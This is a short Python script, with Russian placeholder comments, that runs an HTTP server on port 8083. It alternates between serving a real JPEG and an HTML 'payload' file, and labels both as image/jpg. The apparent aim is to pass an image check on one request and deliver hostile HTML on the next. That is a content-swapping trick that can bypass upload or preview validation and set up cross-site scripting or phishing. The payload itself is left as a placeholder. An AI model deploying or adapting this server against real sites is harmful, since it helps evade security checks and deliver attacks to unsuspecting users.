import http.server
import socketserver
import os

# Define the port number
PORT = 8083
IMAGE = <Сюда путь до любой картинки>.jpeg
PAYLOAD = <Сюда нагрузку>.html
FILE = IMAGE

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.handle_request()

    def do_HEAD(self):
        self.handle_request()

    def handle_request(self):
        global FILE
        self.send_response(200)
        self.send_header('Content-type', 'image/jpg')
        self.end_headers()

        with open(FILE, 'rb') as file:
            self.wfile.write(file.read())

        if FILE == IMAGE:
            FILE = PAYLOAD
        else:
            FILE = IMAGE

with socketserver.TCPServer(("", PORT), MyRequestHandler) as httpd:
    print(f"Serving at port {PORT}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Server stopped.")
    finally:
        httpd.server_close()
        print("Server closed.")
